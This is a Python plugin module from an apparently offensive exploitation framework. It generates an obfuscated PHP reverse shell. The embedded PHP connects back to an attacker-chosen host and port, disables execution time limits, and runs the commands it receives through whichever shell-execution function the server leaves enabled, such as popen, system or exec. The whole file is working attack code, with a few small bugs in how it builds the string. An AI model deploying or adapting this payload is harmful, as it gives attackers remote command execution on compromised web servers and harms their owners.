'''
Created on Jul 24, 2012

@author: aeon
'''

# must include this
from core.core import payload

class payload(payload):
    """
    The generic payload template
    """
    
    def set_title(self):
        self.title = "Generic PHP reverse shell payload"
          
    def set_description(self):
        self.description = \
        """
        This payload executes a reverse shell on the affected target using obfuscated php."""    
        
    def get_payload_type(self):
        return "reverse"
    
    def set_author(self):
        self.author = \
        [
            ['aeon','<aeon.s.flux[at]gmail.com>'],    # zro module
        ]
        
    # needs fixing
    def register_options(self):
        self.opt_params["rhost"] = \
        [
            "127.0.0.1", "The remote host to send the shell to" 
        ]
        self.opt_params["rport"] = \
        [
            4444, "The remote host's port to send the shell to" 
        ]
        
    def initialise_payload(self):
        
        rport = int(self.opt_params["rport"][0])
        rhost = int(self.opt_params["rhost"][0])
        
        self.shell = \
        """
        $ipaddr='%s';
        $port=%s;
        
            @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
            $dis=@ini_get('disable_functions');
            if(!empty($dis)){
                $dis=preg_replace('/[, ]+/', ',', $dis);
                $dis=explode(',', $dis);
                $dis=array_map('trim', $dis);
            }else{
                $dis=array();
            }
            

        if(!function_exists('KcmmUsXxa')){
            function KcmmUsXxa($c){
                global $dis;
                
            if (FALSE === strpos(strtolower(PHP_OS), 'win' )) {
                $c = trim($c, " \n");
                $c=$c." 2>&1\n";
            }
            $oMCj='is_callable';
            $hvLxqZ='in_array';
            
            if($oMCj('popen')and!$hvLxqZ('popen',$dis)){
                $fp=popen($c,'r');
                $o=NULL;
                if(is_resource($fp)){
                    while(!feof($fp)){
                        $o.=fread($fp,1024);
                    }
                }
                @pclose($fp);
            }else
            if($oMCj('proc_open')and!$hvLxqZ('proc_open',$dis)){
                $handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes);
                $o=NULL;
                while(!feof($pipes[1])){
                    $o.=fread($pipes[1],1024);
                }
                @proc_close($handle);
            }else
            if($oMCj('system')and!$hvLxqZ('system',$dis)){
                ob_start();
                system($c);
                $o=ob_get_contents();
                ob_end_clean();
            }else
            if($oMCj('passthru')and!$hvLxqZ('passthru',$dis)){
                ob_start();
                passthru($c);
                $o=ob_get_contents();
                ob_end_clean();
            }else
            if($oMCj('exec')and!$hvLxqZ('exec',$dis)){
                $o=array();
                exec($c,$o);
                $o=join(chr(10),$o).chr(10);
            }else
            if($oMCj('shell_exec')and!$hvLxqZ('shell_exec',$dis)){
                $o=shell_exec($c);
            }else
            {
                $o=0;
            }
        
                return $o;
            }
        }
        $nofuncs='no exec functions';
        if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
            $s=@fsockopen("tcp://%s",$port);
            while($c=fread($s,2048)){
                $out = '';
                if(substr($c,0,3) == 'cd '){
                    chdir(substr($c,3,-1));
                } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
                    break;
                }else{
                    $out=KcmmUsXxa(substr($c,0,-1));
                    if($out===false){
                        fwrite($s,$nofuncs);
                        break;
                    }
                }
                fwrite($s,$out);
            }
            fclose($s);
        }else{
            $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
            @socket_connect($s,$ipaddr,$port);
            @socket_write($s,"socket_create");
            while($c=@socket_read($s,2048)){
                $out = '';
                if(substr($c,0,3) == 'cd '){
                    chdir(substr($c,3,-1));
                } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
                    break;
                }else{
                    $out=KcmmUsXxa(substr($c,0,-1));
                    if($out===false){
                        @socket_write($s,$nofuncs);
                        break;
                    }
                }
                @socket_write($s,$out,strlen($out));
            }
            @socket_close($s);
        }
        """ % (rhost, rport, rhost)
        
        return self.shell
